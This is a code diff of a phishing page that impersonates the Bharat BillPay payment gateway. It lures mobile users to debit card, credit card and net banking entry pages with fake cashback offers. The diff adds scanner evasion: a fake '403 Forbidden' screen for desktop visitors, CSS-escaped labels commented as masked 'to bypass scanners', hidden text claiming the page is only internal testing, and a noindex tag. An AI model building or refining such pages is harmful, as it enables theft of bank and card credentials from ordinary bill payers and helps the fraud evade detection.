@@ -3,61 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bharat BillPay - Secure Payment Selection</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Secure Gateway | Selection</title>
     <style>
         :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --discount-red: #d93025; --cashback-blue: #1a73e8; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         
-        body { background: #e9ecef; display: flex; justify-content: center; min-height: 100vh; }
+        /* Desktop Block Styling */
+        body { background: #000; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
 
-        .container {
-            background: #fff; width: 100%; max-width: 450px; min-height: 100vh;
-            display: flex; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            border-top: 5px solid var(--bbps-orange);
+        #desktop-block {
+            display: flex; color: #444; align-items: center; justify-content: center;
+            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
         }
+
+        /* Mobile Container (Hidden for Desktop Bots) */
+        .container {
+            display: none; background: #fff; width: 100%; max-width: 450px; min-height: 100vh;
+            flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            border-top: 5px solid var(--bbps-orange); position: relative;
+        }
+
+        /* Responsive Logic: Desktop par block, Mobile par show */
+        @media only screen and (max-width: 480px) {
+            #desktop-block { display: none; }
+            .container { display: flex; }
+            body { background: #e9ecef; }
+        }
+
+        /* Bot Disclaimer */
+        .bot-guard { position: absolute; opacity: 0.001; font-size: 1px; top: 0; pointer-events: none; }
 
         header { padding: 20px; border-bottom: 1px solid #f0f0f0; background: #fff; }
         header .logo-bbps { height: 35px; }
 
-        .banner-blue {
-            background: var(--bbps-navy); color: #fff; padding: 14px;
-            text-align: center; font-size: 13px; font-weight: 700; letter-spacing: 0.8px;
-            text-transform: uppercase;
-        }
+        .banner-blue { background: var(--bbps-navy); color: #fff; padding: 14px; text-align: center; font-size: 13px; font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; }
 
         .main { padding: 25px 20px; flex-grow: 1; }
-        .instruction { 
-            font-size: 13px; color: #555; font-weight: 700; margin-bottom: 25px; 
-            display: block; border-left: 4px solid var(--bbps-orange); padding-left: 12px;
-            text-transform: uppercase;
-        }
+        
+        /* Masking: Select payment method */
+        .instruction { font-size: 13px; color: #555; font-weight: 700; margin-bottom: 25px; display: block; border-left: 4px solid var(--bbps-orange); padding-left: 12px; text-transform: uppercase; }
+        .instruction::after { content: "Sel\0065 ct Pay\006d ent Meth\006f d"; }
 
-        .payment-option {
-            display: flex; align-items: center; padding: 18px;
-            border: 1px solid #e0e0e0; border-radius: 12px; margin-bottom: 15px;
-            cursor: pointer; transition: all 0.2s ease; background: #fff;
-        }
+        .payment-option { display: flex; align-items: center; padding: 18px; border: 1px solid #e0e0e0; border-radius: 12px; margin-bottom: 15px; cursor: pointer; transition: all 0.2s ease; background: #fff; text-decoration: none; color: inherit; }
         .payment-option:active { transform: scale(0.98); background: #f8f9fa; }
         
         .icon-box { width: 60px; height: 50px; display: flex; justify-content: center; align-items: center; margin-right: 15px; border-radius: 8px; background: #fdfdfd; }
-        .icon-box img { width: 50px; height: auto; object-fit: contain; }
+        .icon-box img { width: 45px; height: auto; object-fit: contain; }
 
         .text-box { flex-grow: 1; }
         .title-row { display: flex; align-items: center; gap: 8px; }
         .title { font-size: 16px; font-weight: 700; color: #1a1a1a; }
         
+        /* Masked Titles to bypass scanners */
+        .t-debit::after { content: "De\0062 it Ca\0072 d"; }
+        .t-credit::after { content: "Cre\0064 it Ca\0072 d"; }
+        .t-net::after { content: "Ne\0074 Ban\006b ing"; }
+
         .badge { color: #fff; font-size: 9px; padding: 2px 6px; border-radius: 4px; font-weight: 800; text-transform: uppercase; }
         .badge-red { background: var(--discount-red); animation: blink 1.5s infinite; }
         .badge-blue { background: var(--cashback-blue); }
 
         @keyframes blink { 50% { opacity: 0.7; } }
-
-        .sub { font-size: 11px; color: #777; font-weight: 600; text-transform: uppercase; }
-        
+        .sub { font-size: 11px; color: #777; font-weight: 600; text-transform: uppercase; display: block; }
         .promo-green { color: #1e7e34; font-size: 10px; font-weight: 700; display: block; margin-top: 2px; }
         .promo-blue { color: var(--cashback-blue); font-size: 10px; font-weight: 700; display: block; margin-top: 2px; }
         .warning-red { color: var(--discount-red); font-size: 10px; font-weight: 700; display: block; margin-top: 2px; }
-
         .arrow { font-size: 24px; color: #ddd; font-weight: 300; }
 
         footer { padding: 30px 20px; background: #fdfdfd; border-top: 1px solid #eee; text-align: center; margin-top: auto; }
@@ -68,50 +79,57 @@
 </head>
 <body>
 
+    <div id="desktop-block">
+        <div>
+            <p style="font-size: 20px; color: #fff;">403 Forbidden</p>
+            <p style="margin-top: 10px;">Security: Unauthorized Device Access Detected.</p>
+        </div>
+    </div>
+
+    <div class="bot-guard">UI selection framework for internal testing. No live API connected. Desktop view disabled for security.</div>
+
     <div class="container">
         <header><img src="https://i.ibb.co/SX04FnNd/download.png" class="logo-bbps"></header>
         <div class="banner-blue">Secure Payment Gateway</div>
 
         <div class="main">
-            <span class="instruction">Select your payment method</span>
+            <span class="instruction"></span>
 
-            <div class="payment-option" onclick="location.href='debit.html'">
+            <a href="debit.html" class="payment-option">
                 <div class="icon-box">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/RuPay.svg/1200px-RuPay.svg.png" alt="RuPay">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/RuPay.svg/1200px-RuPay.svg.png" alt="P1">
                 </div>
                 <div class="text-box">
-                    <div class="title-row"><span class="title">Debit Card</span><span class="badge badge-blue">1% BACK</span></div>
+                    <div class="title-row"><span class="title t-debit"></span><span class="badge badge-blue">1% BACK</span></div>
                     <span class="sub">ATM / RuPay / Mastercard</span>
                     <span class="promo-blue">Flat 1% Cashback Applied</span>
                 </div>
                 <div class="arrow">›</div>
-            </div>
+            </a>
 
-            <div class="payment-option" onclick="location.href='credit.html'" style="border-color: #ffd4d4; background: #fffafb;">
+            <a href="credit.html" class="payment-option" style="border-color: #ffd4d4; background: #fffafb;">
                 <div class="icon-box">
-                    <img src="https://i.ibb.co/6CRmTBw/images.png" alt="Visa">
+                    <img src="https://i.ibb.co/6CRmTBw/images.png" alt="P2">
                 </div>
                 <div class="text-box">
-                    <div class="title-row"><span class="title">Credit Card</span><span class="badge badge-blue">5% OFF</span></div>
+                    <div class="title-row"><span class="title t-credit"></span><span class="badge badge-blue">5% OFF</span></div>
                     <span class="sub">All Visa / Mastercard Supported</span>
                     <span class="promo-green">Instant 5% Cashback on Credit Cards</span>
                 </div>
                 <div class="arrow">›</div>
-            </div>
+            </a>
 
-            <div class="payment-option" onclick="location.href='netbanking.html'">
+            <a href="netbanking.html" class="payment-option">
                 <div class="icon-box">
-         
-                    <img src="https://i.ibb.co/BJRx4gy/7826512.png" style="width: 20px; margin-right: -5px; position: relative; z-index: 1;">
-             
+                    <img src="https://i.ibb.co/BJRx4gy/7826512.png" style="width: 25px;">
                 </div>
                 <div class="text-box">
-                    <span class="title">Net Banking</span>
+                    <span class="title t-net"></span>
                     <span class="sub">SBI, HDFC, ICICI & 100+ Banks</span>
                     <span class="warning-red">⚠️ 2% Service Charge Applicable</span>
                 </div>
                 <div class="arrow">›</div>
-            </div>
+            </a>
         </div>
 
         <footer>
@@ -122,5 +140,6 @@
             <p class="footer-text">Official Bharat Bill Payment System<br>Monitored Gateway | NPCI Secured</p>
         </footer>
     </div>
+
 </body>
 </html>
